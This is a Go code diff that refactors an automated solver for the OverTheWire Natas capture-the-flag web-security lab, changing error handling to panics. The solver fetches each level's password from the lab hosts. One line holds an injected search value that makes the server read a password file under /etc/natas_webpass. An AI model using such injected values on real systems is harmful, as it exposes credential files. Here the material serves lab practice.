@@ -18,7 +18,7 @@ import (
 var buf memio.Buffer
 
 type Grabber interface {
-	Grab(http.Request) (string, error)
+	Grab(http.Request) string
 }
 
 type Prefixed struct {
@@ -26,20 +26,18 @@ type Prefixed struct {
 	Length int
 }
 
-func (p Prefixed) Grab(r http.Request) (string, error) {
+func (p Prefixed) Grab(r http.Request) string {
 	buf = buf[:0]
 	resp, err := http.DefaultClient.Do(&r)
-	if err != nil {
-		return "", err
-	}
+	e(err)
 	io.Copy(&buf, resp.Body)
 	resp.Body.Close()
 	index := bytes.Index(buf, []byte(p.Prefix))
 
 	if index < 0 || len(buf) < index+len(p.Prefix)+p.Length {
-		return "", errors.Error("failed to get password")
+		panic(errors.Error("failed to get password"))
 	}
-	return string(buf[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]), nil
+	return string(buf[index+len(p.Prefix) : index+len(p.Prefix)+p.Length])
 }
 
 type Path struct {
@@ -47,12 +45,12 @@ type Path struct {
 	Path string
 }
 
-func (p Path) Grab(r http.Request) (string, error) {
+func (p Path) Grab(r http.Request) string {
 	oldPath := r.URL.Path
 	r.URL.Path = p.Path
-	s, err := p.Grabber.Grab(r)
+	s := p.Grabber.Grab(r)
 	r.URL.Path = oldPath
-	return s, err
+	return s
 }
 
 type Headers struct {
@@ -60,14 +58,12 @@ type Headers struct {
 	Headers SetData
 }
 
-func (h Headers) Grab(r http.Request) (string, error) {
+func (h Headers) Grab(r http.Request) string {
 	newHeaders := make(http.Header)
 	for key, value := range r.Header {
 		newHeaders[key] = value
 	}
-	if err := h.Headers.Set(r, newHeaders); err != nil {
-		return "", err
-	}
+	h.Headers.Set(r, newHeaders)
 	r.Header = newHeaders
 	return h.Grabber.Grab(r)
 }
@@ -77,11 +73,9 @@ type Post struct {
 	Data SetData
 }
 
-func (p Post) Grab(r http.Request) (string, error) {
+func (p Post) Grab(r http.Request) string {
 	values := make(url.Values, len(p.Data))
-	if err := p.Data.Set(r, values); err != nil {
-		return "", err
-	}
+	p.Data.Set(r, values)
 	m := memio.Buffer(values.Encode())
 	r.Body = &m
 	r.Method = http.MethodPost
@@ -95,84 +89,67 @@ type Get struct {
 	Data SetData
 }
 
-func (g Get) Grab(r http.Request) (string, error) {
+func (g Get) Grab(r http.Request) string {
 	values := make(url.Values, len(g.Data))
-	if err := g.Data.Set(r, values); err != nil {
-		return "", err
-	}
+	g.Data.Set(r, values)
 	oldQuery := r.URL.RawQuery
 	r.URL.RawQuery = values.Encode()
-	s, err := g.Grabber.Grab(r)
+	s := g.Grabber.Grab(r)
 	r.URL.RawPath = oldQuery
-	return s, err
+	return s
 }
 
 type Hex2Dec struct {
 	Grabber
 }
 
-func (h Hex2Dec) Grab(r http.Request) (string, error) {
-	hx, err := h.Grabber.Grab(r)
-	if err != nil {
-		return "", err
-	}
+func (h Hex2Dec) Grab(r http.Request) string {
+	hx := h.Grabber.Grab(r)
 	dec := make([]byte, hex.DecodedLen(len(hx)))
-	_, err = hex.Decode(dec, []byte(hx))
-	if err != nil {
-		return "", err
-	}
-	return string(dec), nil
+	_, err := hex.Decode(dec, []byte(hx))
+	e(err)
+	return string(dec)
 }
 
 type Reverse struct {
 	Grabber
 }
 
-func (rv Reverse) Grab(r http.Request) (string, error) {
-	str, err := rv.Grabber.Grab(r)
-	if err != nil {
-		return "", err
-	}
+func (rv Reverse) Grab(r http.Request) string {
+	str := rv.Grabber.Grab(r)
 	rts := make([]byte, len(str))
 	for n, b := range []byte(str) {
 		rts[len(rts)-n-1] = b
 	}
-	return string(rts), nil
+	return string(rts)
 }
 
 type Base64Decode struct {
 	Grabber
 }
 
-func (b Base64Decode) Grab(r http.Request) (string, error) {
-	str, err := b.Grabber.Grab(r)
-	if err != nil {
-		return "", err
-	}
+func (b Base64Decode) Grab(r http.Request) string {
+	str := b.Grabber.Grab(r)
 	res, err := base64.StdEncoding.DecodeString(str)
-	if err != nil {
-		return "", err
-	}
-	return string(res), nil
+	e(err)
+	return string(res)
 }
 
 type Cookie struct {
 	Name string
 }
 
-func (c Cookie) Grab(r http.Request) (string, error) {
+func (c Cookie) Grab(r http.Request) string {
 	r.Method = http.MethodHead
 	resp, err := http.DefaultClient.Do(&r)
-	if err != nil {
-		return "", err
-	}
+	e(err)
 	cookies := resp.Cookies()
 	for _, cookie := range cookies {
 		if cookie.Name == c.Name {
-			return cookie.Value, nil
+			return cookie.Value
 		}
 	}
-	return "", errors.Error("could not find cookie")
+	panic(errors.Error("could not find cookie"))
 }
 
 type SetData map[string]Grabber
@@ -181,23 +158,18 @@ type Setter interface {
 	Set(string, string)
 }
 
-func (sd SetData) Set(r http.Request, s Setter) error {
+func (sd SetData) Set(r http.Request, s Setter) {
 	for key, g := range sd {
-		value, err := g.Grab(r)
-		if err != nil {
-			return err
-		}
-		s.Set(key, value)
+		s.Set(key, g.Grab(r))
 	}
-	return nil
 }
 
 type Text struct {
 	Text string
 }
 
-func (t Text) Grab(http.Request) (string, error) {
-	return t.Text, nil
+func (t Text) Grab(http.Request) string {
+	return t.Text
 }
 
 var levels = [...]Grabber{
@@ -214,11 +186,17 @@ var levels = [...]Grabber{
 	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
 }
 
+func e(err error) {
+	if err != nil {
+		panic(err)
+	}
+}
+
 func main() {
 	var (
-		level    uint
-		password string
-		err      error
+		level     uint
+		password  string
+		thisLevel int
 	)
 	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
 	flag.StringVar(&password, "p", "natas0", "password for initial level")
@@ -228,19 +206,21 @@ func main() {
 		Header: make(http.Header),
 	}
 
-	for n, grabber := range levels[level:] {
-		n += int(level)
-
-		log.Printf("natas %2d: Solving...", n)
-
-		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", n))
-		r.SetBasicAuth(fmt.Sprintf("natas%d", n), password)
-
-		password, err = grabber.Grab(r)
-		if err != nil {
-			log.Printf("natas %2d: error: %s", n, err)
-			return
+	defer func() {
+		if err := recover(); err != nil {
+			log.Printf("natas %2d: error: %s", thisLevel, err)
 		}
-		log.Printf("natas %2d: Password: %s", n, password)
+	}()
+
+	for n, grabber := range levels[level:] {
+		thisLevel = int(level) + n
+
+		log.Printf("natas %2d: Solving...", thisLevel)
+
+		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", thisLevel))
+		r.SetBasicAuth(fmt.Sprintf("natas%d", thisLevel), password)
+
+		password = grabber.Grab(r)
+		log.Printf("natas %2d: Password: %s", thisLevel, password)
 	}
 }
